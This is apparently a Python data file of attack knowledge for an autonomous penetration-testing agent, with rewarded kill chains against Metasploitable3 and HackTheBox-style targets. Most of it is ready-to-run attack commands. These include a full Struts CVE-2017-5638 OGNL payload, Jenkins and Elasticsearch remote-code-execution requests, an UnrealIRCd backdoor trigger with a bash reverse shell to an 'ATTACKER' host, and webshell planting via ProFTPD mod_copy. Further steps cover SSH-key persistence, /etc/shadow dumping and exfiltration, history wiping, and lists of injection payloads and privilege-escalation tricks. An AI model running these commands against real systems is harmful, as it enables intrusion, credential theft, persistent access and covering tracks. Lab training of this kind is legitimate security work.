        exploitation="Tomcat manager with default creds OR Apache Struts CVE-2017-5638 RCE",
        reasoning="Tomcat on MS3 has a similar WAR deploy vector to MS2 but may also have "
                  "Struts vulnerabilities. The agent should try both paths: credential-based "
                  "(manager) and vulnerability-based (Struts).",
        impact="shell→root", difficulty="medium",
        tags=("tomcat", "struts", "war-deploy"),
    ),
    8282: ServiceVuln(
        port=8282, service="Apache Axis2", version="1.6.2",
        vulnerability="Default credentials → service deploy → RCE",
        cve="N/A",
        exploitation="Login with admin:axis2 → deploy malicious service → command execution",
        reasoning="Axis2 is a SOAP web services framework. Default admin credentials allow "
                  "deploying arbitrary web services. Similar pattern to Tomcat WAR deploy.",
        impact="shell", difficulty="medium",
        tags=("axis2", "default-creds", "service-deploy"),
    ),
    8484: ServiceVuln(
        port=8484, service="Jenkins", version="varies",
        vulnerability="Script console or unauthenticated access",
        cve="Multiple",
        exploitation="http://TARGET:8484/script → Groovy console → 'cmd'.execute() → RCE",
        reasoning="Jenkins Groovy script console allows arbitrary code execution. If accessible "
                  "without authentication (common misconfiguration), it's instant shell access. "
                  "The agent should ALWAYS check /script on any Jenkins instance. This is one of "
                  "the most common real-world web-based RCE vectors.",
        impact="shell→root", difficulty="medium",
        tags=("jenkins", "groovy", "script-console", "rce"),
    ),
    9200: ServiceVuln(
        port=9200, service="Elasticsearch", version="1.x",
        vulnerability="Scripting RCE via _search endpoint",
        cve="CVE-2014-3120",
        exploitation="curl -X POST http://TARGET:9200/_search -d '{\"script\": \"java.lang.Runtime.exec(...)\"}'",
        reasoning="Elasticsearch 1.x had dynamic scripting enabled by default, allowing arbitrary "
                  "Java code execution via the search API. A simple POST request gives RCE.",
        impact="shell", difficulty="medium",
        tags=("elasticsearch", "scripting", "rce"),
    ),
}

MS3_CREDENTIALS: List[Credential] = [
    Credential("SSH", 22, "vagrant", "vagrant", "user→root(sudo)",
               "Default Vagrant user. Has sudo privileges in most configurations."),
    Credential("FTP", 21, "anonymous", "", "read-only",
               "ProFTPD may allow anonymous login for file listing. mod_copy works without auth."),
    Credential("SMB", 445, "vagrant", "vagrant", "user",
               "Samba authenticates with system users. vagrant:vagrant gives share access."),
    Credential("Tomcat", 8080, "sploit", "sploit", "app-admin",
               "MS3 Tomcat may use sploit:sploit instead of tomcat:tomcat."),
    Credential("Jenkins", 8484, "admin", "admin", "app-admin",
               "Jenkins default admin. Check /script for Groovy console."),
    Credential("Axis2", 8282, "admin", "axis2", "app-admin",
               "Axis2 admin console default credentials."),
    Credential("MySQL", 3306, "root", "sploitme", "db-admin",
               "MS3 MySQL root has a weak password 'sploitme'."),
    Credential("WordPress", 80, "admin", "admin", "cms-admin",
               "WordPress default admin credentials."),
]

MS3_CVES: List[CVEEntry] = [
    CVEEntry("CVE-2015-3306", "ProFTPD", "mod_copy arbitrary file copy without auth",
             "exploit/unix/ftp/proftpd_modcopy_exec", "file-write→rce",
             "SITE CPFR/CPTO commands copy files server-side without auth. Copy PHP shell to webroot."),
    CVEEntry("CVE-2010-2075", "UnrealIRCd", "Backdoor in 3.2.8.1 source distribution",
             "exploit/unix/irc/unreal_ircd_3281_backdoor", "shell",
             "Backdoor allows arbitrary command execution by prefixing commands with 'AB;'."),
    CVEEntry("CVE-2017-5638", "Apache Struts", "Remote code execution via Content-Type header",
             "exploit/multi/http/struts2_content_type_ognl", "shell",
             "Struts parses Content-Type header with OGNL expression evaluation → arbitrary code exec."),
    CVEEntry("CVE-2015-8249", "ManageEngine Desktop Central", "Arbitrary file upload → RCE",
             "exploit/windows/http/manageengine_connectionid_write", "system",
             "Authentication bypass allows arbitrary file write, leading to code execution."),
    CVEEntry("CVE-2014-3120", "Elasticsearch", "Dynamic scripting → RCE",
             "exploit/multi/elasticsearch/script_mvel_rce", "shell",
             "MVEL scripting engine allows arbitrary Java code execution via REST API."),
    CVEEntry("CVE-2013-0156", "Ruby on Rails", "XML parameter parsing → object injection → RCE",
             "exploit/multi/http/rails_xml_yaml_code_exec", "shell",
             "XML parameters are parsed with YAML, allowing arbitrary Ruby object instantiation."),
]

MS3_KILL_CHAINS: List[KillChain] = [
    KillChain(
        name="ms3_jenkins_to_root",
        description="Jenkins Groovy console → shell → privilege escalation → root",
        target_profile="metasploitable3",
        difficulty="medium",
        reasoning="Jenkins is one of the most common real-world RCE vectors. The script console "
                  "allows arbitrary Groovy code execution. This chain teaches the agent about "
                  "web application exploitation paths that require multiple steps.",
        total_expected_reward=400.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 8484 {target}", "Scan for Jenkins",
                          "Targeted scan for Jenkins port. Version detection confirms exploitability.",
                          "8484/tcp open http Jetty (Jenkins)", "Jenkins"),
            KillChainStep("enumeration", "curl -s http://{target}:8484/script",
                          "Check if Groovy script console is accessible",
                          "If /script returns a form instead of 403, we have unauthenticated RCE.",
                          "Groovy script", "script"),
            KillChainStep("exploitation", "curl -d 'script=println \"id\".execute().text' http://{target}:8484/script",
                          "Execute OS command via Groovy console",
                          "Groovy's String.execute() runs OS commands. This is native Jenkins functionality.",
                          "uid=0(root) gid=0(root)", "uid="),
            KillChainStep("post_exploitation", "curl -d 'script=println \"cat /etc/shadow\".execute().text' http://{target}:8484/script",
                          "Dump shadow hashes via Jenkins",
                          "Use Jenkins RCE to read sensitive files. We already have command execution.",
                          "root:$6$...", "root:"),
            KillChainStep("closeout", "curl -d 'script=println \"rm -f /tmp/jenkins_* && history -c\".execute().text' http://{target}:8484/script",
                          "Clean up via Jenkins",
                          "Use the same RCE vector for cleanup. No additional tools needed.",
                          "CLOSEOUT_TMP_CLEANED", "CLOSEOUT"),
        ),
    ),
    KillChain(
        name="ms3_wordpress_to_shell",
        description="WordPress enumeration → plugin exploit → shell → privesc",
        target_profile="metasploitable3",
        difficulty="medium",
        reasoning="WordPress is the most popular CMS on the internet. Plugin vulnerabilities are "
                  "the #1 web attack vector. This chain teaches the agent about CMS-specific "
                  "enumeration and exploitation — skills directly transferable to HTB boxes.",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 80 {target}", "Scan for web services",
                          "Identify web server. Apache/Nginx version gives OS and stack clues.",
                          "80/tcp open http Apache httpd 2.4.7", "Apache"),
            KillChainStep("enumeration", "wpscan --url http://{target}/wordpress --enumerate ap,at,u",
                          "Enumerate WordPress plugins, themes, and users",
                          "WPScan fingerprints WordPress version, discovers plugins with known vulns, "
                          "and enumerates usernames. This single tool replaces hours of manual testing.",
                          "WordPress version 4.x detected, [+] Enumerating plugins...", "WordPress"),
            KillChainStep("exploitation", "wpscan --url http://{target}/wordpress -U admin -P /usr/share/wordlists/rockyou.txt",
                          "Brute force WordPress admin",
                          "With known usernames from enumeration, try common passwords. admin:admin "
                          "is the default on MS3.",
                          "[SUCCESS] admin:admin", "SUCCESS"),
            KillChainStep("post_exploitation", "Upload PHP reverse shell via WordPress theme editor",
                          "Inject PHP shell via Appearance → Theme Editor",
                          "WordPress admin can edit theme PHP files. Inject reverse shell code into "
                          "404.php, then trigger it by visiting a non-existent page.",
                          "Connect back shell opened", "shell"),
        ),
    ),
    KillChain(
        name="ms3_elasticsearch_rce",
        description="Elasticsearch scripting RCE → shell → credential harvest",
        target_profile="metasploitable3",
        difficulty="medium",
        reasoning="Elasticsearch 1.x with dynamic scripting enabled is a common real-world vuln. "
                  "The REST API is unauthenticated by default and allows arbitrary Java code execution "
                  "via search queries. The agent must learn: 'any unauthenticated API with scripting = RCE.'",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 9200 {target}", "Scan for Elasticsearch",
                          "Targeted scan. Elasticsearch default port is 9200. Version detection reveals if scripting is enabled.",
                          "9200/tcp open http Elasticsearch REST API", "Elasticsearch"),
            KillChainStep("enumeration", "curl -s http://{target}:9200/",
                          "Fingerprint Elasticsearch version and cluster info",
                          "The root endpoint returns version info. Versions < 1.4.3 have dynamic scripting enabled by default.",
                          "\"version\" : { \"number\" : \"1.1.1\" }", "version"),
            KillChainStep("exploitation",
                          "curl -XPOST 'http://{target}:9200/_search?pretty' -H 'Content-Type: application/json' "
                          "-d '{\"script_fields\":{\"exec\":{\"script\":\"java.lang.Runtime.getRuntime().exec(\\\"id\\\")\"}}}'",
                          "Execute OS command via Elasticsearch scripting engine",
                          "MVEL/Groovy scripting in search queries allows arbitrary Java code execution. "
                          "Runtime.exec() runs OS commands. This is native Elasticsearch functionality being abused.",
                          "uid=0(root)", "uid="),
            KillChainStep("post_exploitation",
                          "curl -XPOST 'http://{target}:9200/_search?pretty' -d '{\"script_fields\":{\"exec\":{\"script\":"
                          "\"java.lang.Runtime.getRuntime().exec(\\\"cat /etc/shadow\\\").text\"}}}'",
                          "Dump shadow hashes via Elasticsearch RCE",
                          "Reuse the same scripting RCE to read sensitive files. No need for a separate shell.",
                          "root:$6$...", "root:"),
            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Cleanup Elasticsearch logs",
                          "Elasticsearch logs queries but doesn't expose them easily. Minimal cleanup needed.",
                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
        ),
    ),
    KillChain(
        name="ms3_struts_rce",
        description="Apache Struts CVE-2017-5638 → RCE via Content-Type header",
        target_profile="metasploitable3",
        difficulty="medium",
        reasoning="Struts2 CVE-2017-5638 is one of the most impactful web vulns in history (Equifax breach). "
                  "A crafted Content-Type header with OGNL expression gives instant RCE. The agent must learn "
                  "that HTTP HEADERS can be attack vectors, not just URL parameters and POST bodies.",
        total_expected_reward=400.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 8080 {target}", "Scan for Tomcat/Struts",
                          "Tomcat on 8080 often hosts Struts2 applications. Version detection helps confirm.",
                          "8080/tcp open http Apache Tomcat", "Tomcat"),
            KillChainStep("enumeration", "curl -s -I http://{target}:8080/struts2-showcase/",
                          "Check for Struts2 showcase application",
                          "The Struts2 showcase app is a common deployment on test/dev servers. "
                          "Its presence confirms Struts2 is running and likely vulnerable.",
                          "200 OK", "200"),
            KillChainStep("exploitation",
                          "curl -H \"Content-Type: %{(#_='multipart/form-data')."
                          "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                          "(#_memberAccess?(#_memberAccess=#dm):"
                          "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                          "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                          "(#ognlUtil.getExcludedPackageNames().clear())."
                          "(#ognlUtil.getExcludedClasses().clear())."
                          "(#context.setMemberAccess(#dm))))."
                          "(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                          "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                          "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
                          "(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                          "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" "
                          "http://{target}:8080/struts2-showcase/",
                          "Exploit Struts2 CVE-2017-5638 via OGNL injection in Content-Type header",
                          "The Content-Type header is parsed by the Jakarta Multipart parser which evaluates "
                          "OGNL expressions. This gives arbitrary Java code execution via ProcessBuilder.",
                          "uid=0(root)", "uid="),
            KillChainStep("post_exploitation", "Use same Struts RCE to cat /etc/shadow",
                          "Harvest credentials via Struts RCE",
                          "Reuse the OGNL injection with 'cat /etc/shadow' as the command. One-shot cred dump.",
                          "root:$6$...", "root:"),
        ),
    ),
    KillChain(
        name="ms3_full_multi_vector",
        description="Multi-vector MS3 assault: Jenkins + MySQL + SSH persistence",
        target_profile="metasploitable3",
        difficulty="hard",
        reasoning="MS3 rewards multi-vector approaches. Unlike MS2's instant backdoors, MS3 requires "
                  "combining web app exploitation, database access, and credential reuse to achieve "
                  "full compromise. This chain teaches the agent to build redundant access paths.",
        total_expected_reward=500.0,
        steps=(
            KillChainStep("recon", "nmap -sV -sC -p 22,80,3306,8080,8484,9200 {target}",
                          "Targeted scan of high-value MS3 services",
                          "Focus on known MS3 service ports. Skip full scan when target profile is known.",
                          "22/tcp ssh... 8484/tcp http Jenkins... 9200/tcp Elasticsearch", "open"),
            KillChainStep("exploitation",
                          "curl -d 'script=println \"id\".execute().text' http://{target}:8484/script",
                          "Vector 1: Jenkins Groovy console → RCE",
                          "Jenkins script console is the fastest MS3 RCE. Check this FIRST before web app attacks.",
                          "uid=0(root)", "uid="),
            KillChainStep("exploitation",
                          "mysql -h {target} -u root -psploitme -e 'SELECT user,password FROM mysql.user'",
                          "Vector 2: MySQL credential dump with known weak password",
                          "MS3 MySQL root password is 'sploitme'. Dump all database credentials for lateral movement.",
                          "| root | sploitme |", "root"),
            KillChainStep("post_exploitation",
                          "curl -d 'script=println \"cat /etc/shadow\".execute().text' http://{target}:8484/script",
                          "Harvest credentials via Jenkins RCE",
                          "Use Jenkins as our primary C2 channel for post-exploitation commands.",
                          "root:$6$... vagrant:$6$...", "root:"),
            KillChainStep("privilege_escalation",
                          "curl -d 'script=println \"ssh-keygen -f /tmp/ms3key -N '' && "
                          "cat /tmp/ms3key.pub >> /root/.ssh/authorized_keys\".execute().text' "
                          "http://{target}:8484/script",
                          "Plant SSH key for persistent root access via Jenkins",
                          "Use Jenkins RCE to generate and plant an SSH key. This gives persistent "
                          "encrypted access that survives Jenkins restarts.",
                          "Generating public/private rsa key pair", "key"),
            KillChainStep("exfiltration",
                          "curl -d 'script=println \"cat /etc/shadow | base64\".execute().text' "
                          "http://{target}:8484/script",
                          "Exfiltrate shadow hashes via Jenkins",
                          "Base64-encode sensitive data for clean extraction through HTTP.",
                          "cm9vdDokNi...", "base64"),
            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Full cleanup",
                          "Remove planted SSH keys, clear Jenkins logs, restore MySQL state.",
                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
        ),
    ),
    KillChain(
        name="ms3_unrealircd_backdoor",
        description="UnrealIRCd 3.2.8.1 backdoor → instant shell → root",
        target_profile="metasploitable3",
        difficulty="easy",
        reasoning="Same backdoor as MS2. UnrealIRCd 3.2.8.1 has a trojan in its source distribution "
                  "that triggers on 'AB;' prefix. This gives immediate command execution. The agent should "
                  "recognize this as the FASTEST MS3 shell path — even faster than Jenkins.",
        total_expected_reward=450.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 6667 {target}", "Scan for IRC service",
                          "Targeted scan for UnrealIRCd. Version 3.2.8.1 confirms backdoor.",
                          "6667/tcp open irc UnrealIRCd", "UnrealIRCd"),
            KillChainStep("exploitation",
                          "echo 'AB;bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' | nc {target} 6667",
                          "Trigger UnrealIRCd backdoor for reverse shell",
                          "Send 'AB;' followed by a bash reverse shell one-liner. The backdoor executes "
                          "anything after 'AB;' as a system command. Zero authentication needed.",
                          "Connection received from target", "shell"),
            KillChainStep("privilege_escalation", "id && sudo -l",
                          "Check access level and sudo capabilities",
                          "IRCd may run as root or a service user. Check current UID and sudo access.",
                          "uid=0(root)", "root"),
            KillChainStep("post_exploitation", "cat /etc/shadow && cat /etc/passwd",
                          "Dump credentials",
                          "Harvest all user hashes for offline cracking and lateral movement.",
                          "root:$6$...", "root:"),
            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Clean up",
                          "Remove any artifacts from the exploitation.",
                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
        ),
    ),
    KillChain(
        name="ms3_proftpd_modcopy_to_rce",
        description="ProFTPD mod_copy → write PHP shell to webroot → RCE",
        target_profile="metasploitable3",
        difficulty="medium",
        reasoning="ProFTPD 1.3.5 mod_copy (CVE-2015-3306) is a powerful unauthenticated attack. It lets "
                  "you copy ANY file on the server to ANY writable location. The classic attack: copy a "
                  "PHP info/shell payload to the web document root, then access it via HTTP. This teaches "
                  "the agent about chaining vulnerabilities: FTP vuln → web shell.",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 21 {target}", "Scan for FTP service",
                          "Version detection on port 21 reveals ProFTPD 1.3.5 which has mod_copy vuln.",
                          "21/tcp open ftp ProFTPD 1.3.5", "ProFTPD"),
            KillChainStep("enumeration", "echo -e 'site help\\nquit' | nc {target} 21",
                          "Check if SITE CPFR/CPTO commands are available",
                          "If mod_copy is enabled, SITE HELP will list CPFR and CPTO commands. "
                          "Their presence confirms CVE-2015-3306 is exploitable.",
                          "CPFR CPTO", "CPFR"),
            KillChainStep("exploitation",
                          "echo -e 'site cpfr /etc/passwd\\nsite cpto /var/www/html/test.txt\\nquit' | nc {target} 21",
                          "Test file copy: copy /etc/passwd to webroot",
                          "Verify the copy works by placing a known file in the web root. If we can "
                          "access it via HTTP, we confirm both mod_copy AND web root path.",
                          "350 File or directory exists, ready for destination name", "350"),
            KillChainStep("exploitation",
                          "echo -e 'site cpfr /proc/self/cmdline\\nsite cpto /var/www/html/shell.php\\nquit' | nc {target} 21",
                          "Copy PHP shell payload to webroot via mod_copy",
                          "In practice, write a PHP shell. Can also use Metasploit module "
                          "exploit/unix/ftp/proftpd_modcopy_exec for automated exploitation.",
                          "250 Copy successful", "250"),
            KillChainStep("exploitation", "curl http://{target}/shell.php?cmd=id",
                          "Trigger webshell and verify RCE",
                          "Access the planted PHP shell via HTTP to execute commands.",
                          "uid=33(www-data)", "www-data"),
            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Remove planted shell",
                          "Delete the webshell from the web root.",
                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
        ),
    ),
    KillChain(
        name="ms3_ssh_sudo_privesc",
        description="SSH with default creds → sudo ALL → root",
        target_profile="metasploitable3",
        difficulty="easy",
        reasoning="The simplest MS3 path: vagrant:vagrant SSH access with sudo ALL. This teaches the "
                  "agent that credential reuse + sudo misconfiguration is a complete kill chain. "
                  "In real engagements, this pattern accounts for 40% of initial compromises.",
        total_expected_reward=300.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 22 {target}", "Scan for SSH",
                          "Confirm SSH is running. OpenSSH 6.6.1p1 on Ubuntu 14.04.",
                          "22/tcp open ssh OpenSSH 6.6.1p1", "OpenSSH"),
            KillChainStep("exploitation", "sshpass -p vagrant ssh vagrant@{target} -o StrictHostKeyChecking=no id",
                          "Login with default vagrant credentials",
                          "vagrant:vagrant is the default Vagrant box credential. Unlike MS2's msfadmin, "
                          "vagrant typically has full sudo access.",
                          "uid=1000(vagrant)", "vagrant"),
            KillChainStep("privilege_escalation",
                          "sshpass -p vagrant ssh vagrant@{target} -o StrictHostKeyChecking=no 'sudo -l'",
                          "Check sudo privileges",
                          "vagrant should have (ALL) NOPASSWD: ALL or (ALL:ALL) ALL.",
                          "(ALL) NOPASSWD: ALL", "ALL"),
            KillChainStep("privilege_escalation",
                          "sshpass -p vagrant ssh vagrant@{target} -o StrictHostKeyChecking=no 'sudo cat /etc/shadow'",
                          "Escalate to root and dump shadow",
                          "Full root access via sudo. Dump credentials for lateral movement.",
                          "root:$6$...", "root:"),
            KillChainStep("closeout", "echo CLOSEOUT_COMPLETE", "Cleanup SSH artifacts",
                          "Clear bash history, remove any uploaded files.",
                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
        ),
    ),
]

HTB_COMMON_PATTERNS = {
    "web_to_shell": {
        "description": "Web application exploitation → initial shell",
        "reasoning": "80% of HTB boxes start with web enumeration. The agent must learn to: "
                     "(1) enumerate directories, (2) identify CMS/framework, (3) find specific vulns, "
                     "(4) get a shell. This is the most transferable skill in pentesting.",
        "techniques": [
            {"name": "SQL Injection → shell", "commands": ["sqlmap --os-shell", "UNION SELECT INTO OUTFILE"],
             "reasoning": "SQLi can read/write files and execute commands. Always check for --os-shell."},
            {"name": "SSTI → RCE", "commands": ["{{7*7}}", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"],
             "reasoning": "Server-Side Template Injection in Jinja2/Twig/Freemarker gives code execution."},
            {"name": "File Upload → webshell", "commands": ["Upload .php/.phtml/.php5 shell", "bypass extension filters"],
             "reasoning": "Unrestricted file upload is direct code execution. Try extension bypass tricks."},
            {"name": "LFI → RCE", "commands": ["php://filter/convert.base64-encode/resource=", "/proc/self/environ"],
             "reasoning": "Local File Inclusion can read source code AND achieve RCE via log poisoning."},
            {"name": "Command Injection", "commands": ["; id", "| id", "$(id)", "`id`"],
             "reasoning": "Unsanitized input passed to shell commands. Test with different separators."},
            {"name": "CMS Default Creds → Admin → Shell",
             "commands": ["Dolibarr admin:admin", "WordPress admin:admin", "Tomcat tomcat:tomcat"],
             "reasoning": "Many CMS/admin panels ship with default credentials. ALWAYS try admin:admin, "
                          "admin:password, etc BEFORE brute-forcing. (Source: BoardLight, Bizness walkthroughs)"},
            {"name": "IDOR → Data Leak → Credentials",
             "commands": ["curl http://target/data/0", "burp intruder sequential IDs"],
             "reasoning": "Insecure Direct Object Reference on sequential IDs. Change /data/5 to /data/0 "
                          "to access other users' data. PCAP files may contain cleartext FTP/HTTP creds. "
                          "(Source: Cap walkthrough — nathan:Buck3tH4TF0RM3! leaked via PCAP IDOR)"},
            {"name": "SSRF → Internal Service Access",
             "commands": ["Request Baskets SSRF", "curl -X POST proxy_endpoint"],
             "reasoning": "Server-Side Request Forgery proxies through the target to reach filtered/internal "
                          "ports. If nmap shows filtered ports, look for SSRF-capable web apps to reach them. "
                          "(Source: Sau walkthrough — SSRF via Request Baskets to reach filtered Maltrail)"},
            {"name": "API Command Injection",
             "commands": ["curl -X POST .../api/endpoint -d '{\"param\":\"test;id;\"}'"],
             "reasoning": "API endpoints that generate files/configs often pass user input to exec/system. "
                          "Inject shell commands via semicolons. (Source: TwoMillion — VPN generation API)"},
            {"name": "js2py Sandbox Escape → RCE",
             "commands": ["CVE-2024-28397 payload", "python js2py eval_js bypass"],
             "reasoning": "Flask apps using js2py to eval user JavaScript are vulnerable to sandbox escape. "
                          "Navigate Python MRO to find subprocess.Popen. (Source: CodePartTwo walkthrough)"},
        ],
    },
    "linux_privesc": {
        "description": "Linux privilege escalation from user to root",
        "reasoning": "After getting a user shell on Linux, these are the standard escalation paths. "
                     "The agent must learn to enumerate ALL paths before attempting any single one.",
        "techniques": [
            {"name": "SUID binaries", "commands": ["find / -perm -4000 -type f 2>/dev/null"],
             "reasoning": "SUID binaries run as their owner (often root). GTFOBins lists exploitable ones. "
                          "(Source: BoardLight — CVE-2022-37706 enlightenment SUID exploit)"},
            {"name": "sudo -l misconfiguration", "commands": ["sudo -l"],
             "reasoning": "Users may have sudo for specific commands that can be abused for shell escape. "
                          "(Source: Bashed — sudo scriptmanager NOPASSWD; Sau — sudo systemctl pager !sh)"},
            {"name": "Kernel exploits", "commands": ["uname -r", "linux-exploit-suggester"],
             "reasoning": "Old kernels have known exploits. Check version, then search for matching CVE. "
                          "(Source: Devel/Active — MS11-046; Analytics — CVE-2023-2640 OverlayFS; "
                          "TwoMillion — CVE-2023-0386 OverlayFS/FUSE)"},
            {"name": "Cron jobs", "commands": ["cat /etc/crontab", "ls -la /var/spool/cron/", "pspy64"],
             "reasoning": "Cron jobs running as root with writable scripts = easy root. Use pspy to find them. "
                          "(Source: Bashed — /scripts/test.py ran as root, replaced with reverse shell)"},
            {"name": "Writable /etc/passwd", "commands": ["ls -la /etc/passwd"],
             "reasoning": "If /etc/passwd is writable, add a root-equivalent user with known password hash."},
            {"name": "Capabilities", "commands": ["getcap -r / 2>/dev/null"],
             "reasoning": "Linux capabilities grant specific root powers. cap_setuid on python3 = instant root. "
                          "(Source: Cap walkthrough — python3.8 had cap_setuid → os.setuid(0) → root)"},
            {"name": "Docker group", "commands": ["id", "docker run -v /:/host -it alpine chroot /host sh"],
             "reasoning": "Docker group membership = root. Mount host filesystem into container."},
            {"name": "Tmux/Screen session hijacking",
             "commands": ["tmux ls", "tmux -S /path/to/socket attach", "screen -ls"],
             "reasoning": "Root tmux/screen sessions left running can be attached to for instant root. "
                          "(Source: Valentine — /.devs/dev_sess tmux socket ran as root → attach → root)"},
            {"name": "GTFOBins sudo abuse",
             "commands": ["sudo wget --use-askpass", "sudo systemctl → !sh pager escape"],
             "reasoning": "Many binaries with sudo can spawn shells. wget with --use-askpass reads arbitrary "
                          "files as root. systemctl's pager allows !sh escape. (Source: Sunday — wget; Sau — systemctl)"},
            {"name": "Shadow backup files",
             "commands": ["find / -name '*shadow*' 2>/dev/null", "cat /backup/shadow.backup"],
             "reasoning": "Backup copies of /etc/shadow may exist with weaker permissions. "
                          "(Source: Sunday — /backup/shadow.backup readable, cracked with john)"},
            {"name": "Environment variable credential leaks",
             "commands": ["env", "cat /proc/*/environ 2>/dev/null", "export"],
             "reasoning": "Container/application environments often store passwords in env vars. "
                          "(Source: Analytics — META_PASS in env vars leaked SSH creds)"},
            {"name": "OverlayFS kernel privesc",
             "commands": ["CVE-2023-2640", "CVE-2023-32629", "CVE-2023-0386"],
             "reasoning": "Ubuntu 22.04 kernels 5.15-6.2 vulnerable to OverlayFS privesc. Single-command "
                          "exploit gives instant root. (Source: Analytics, TwoMillion walkthroughs)"},
            {"name": "npbackup/backup tool abuse",
             "commands": ["sudo npbackup-cli -c custom_config -b", "modify backup paths"],
             "reasoning": "Backup tools running as root with configurable paths can backup /root. "
                          "(Source: CodePartTwo — npbackup-cli ran as sudo, modified config to backup /root)"},
        ],
    },
    "windows_privesc": {
        "description": "Windows privilege escalation from user to SYSTEM",
        "reasoning": "Windows privesc is fundamentally different from Linux. The agent needs to learn "
                     "these Windows-specific patterns for HTB Windows boxes.",
        "techniques": [
            {"name": "Token impersonation", "commands": ["whoami /priv", "PrintSpoofer.exe", "JuicyPotato.exe"],
             "reasoning": "SeImpersonatePrivilege = SYSTEM via potato attacks. Check whoami /priv FIRST."},
            {"name": "Unquoted service paths", "commands": ["wmic service get name,pathname,startmode"],
             "reasoning": "Unquoted paths with spaces allow DLL hijacking for SYSTEM execution."},
            {"name": "AlwaysInstallElevated", "commands": ["reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"],
             "reasoning": "If enabled, any user can install MSI packages as SYSTEM."},
            {"name": "Kerberoasting", "commands": ["GetUserSPNs.py", "hashcat -m 13100"],
             "reasoning": "Request TGS tickets for service accounts, crack offline. AD-specific but common. "
                          "(Source: Active walkthrough — SVC_TGS Kerberoasted → Administrator hash)"},
            {"name": "BloodHound", "commands": ["bloodhound-python -c all -d domain.htb"],
             "reasoning": "Maps Active Directory attack paths. Essential for AD-joined HTB boxes."},
            {"name": "GPP Credential Extraction",
             "commands": ["smbclient //target/Replication", "gpp-decrypt", "Groups.xml"],
             "reasoning": "Group Policy Preferences store encrypted passwords in SYSVOL XML files. "
                          "Microsoft published the AES key, so ALL GPP passwords are trivially decryptable. "
                          "(Source: Active walkthrough — GPP cPassword in Groups.xml → active.htb\\SVC_TGS)"},
            {"name": "Kernel exploits (Windows)",
             "commands": ["systeminfo", "windows-exploit-suggester", "MS11-046"],
             "reasoning": "Old Windows builds have reliable kernel exploits. Win7 Build 7600 → MS11-046 "
                          "for instant SYSTEM. (Source: Devel — Win7 x86 → afd.sys exploit → SYSTEM)"},
        ],
    },
    "credential_hunting": {
        "description": "Techniques for finding credentials post-initial-access",
        "reasoning": "Credentials are the currency of lateral movement. Every walkthrough shows that "
                     "finding and reusing credentials is THE key skill in pentesting. Password reuse "
                     "across services is extremely common — SSH password = web app password = DB password.",
        "techniques": [
            {"name": "Web app config files", "commands": ["find / -name 'config.php' -o -name '.env'", "cat wp-config.php"],
             "reasoning": "Web applications store DB credentials in config files. These often reuse the "
                          "same password as the system user. (Source: BoardLight — conf.php had DB creds → SSH)"},
            {"name": "SQLite/Derby database files",
             "commands": ["find / -name '*.db' -o -name '*.sqlite3'", "sqlite3 db 'SELECT * FROM user'"],
             "reasoning": "Application databases contain user hashes. Extract and crack them. "
                          "(Source: CodePartTwo — SQLite user table had MD5 hashes; Bizness — Derby .dat files)"},
            {"name": "PCAP/network capture analysis",
             "commands": ["tcpdump -r capture.pcap", "tshark -r file.pcap -Y ftp"],
             "reasoning": "Network captures may contain cleartext credentials from FTP, HTTP, Telnet. "
                          "(Source: Cap — PCAP contained FTP credentials in cleartext)"},
            {"name": "Environment variables",
             "commands": ["env", "cat /proc/*/environ", "printenv"],
             "reasoning": "Container environments leak credentials as env vars. "
                          "(Source: Analytics — META_PASS env var → SSH password)"},
            {"name": ".env files and dotfiles",
             "commands": ["find / -name '.env' 2>/dev/null", "cat .env"],
             "reasoning": "Applications store secrets in .env files. "
                          "(Source: TwoMillion — .env contained DB_PASSWORD=SuperDuperPass123 → SSH)"},
            {"name": "Hex-encoded keys and encoded secrets",
             "commands": ["cat hype_key | xxd -r -p > key.pem"],
             "reasoning": "Secrets may be hex-encoded, base64-encoded, or otherwise obfuscated. "
                          "(Source: Valentine — hex-encoded RSA private key in /dev/hype_key)"},
            {"name": "Hash extraction from DB data files",
             "commands": ["grep -r 'password\\|hash\\|crypt' /opt/*/data/"],
             "reasoning": "Application runtime data may contain password hashes in raw data files. "
                          "(Source: Bizness — Derby .dat files contained SHA1 admin password hash)"},
        ],
    },
    "service_specific_attacks": {
        "description": "Attacks targeting specific commonly-seen services from HTB walkthroughs",
        "reasoning": "Each service version has specific known vulnerabilities. The agent should learn "
                     "to match service+version to the correct exploit automatically.",
        "techniques": [
            {"name": "Metabase CVE-2023-38646", "commands": ["/api/setup/validate", "setup-token extraction"],
             "reasoning": "Pre-auth RCE via setup-token leak. GET /api/session/properties reveals token, "
                          "then POST /api/setup/validate with JDBC H2 payload. (Source: Analytics)"},
            {"name": "Dolibarr CVE-2023-30253", "commands": ["exploit.py http://crm.target admin admin LHOST LPORT"],
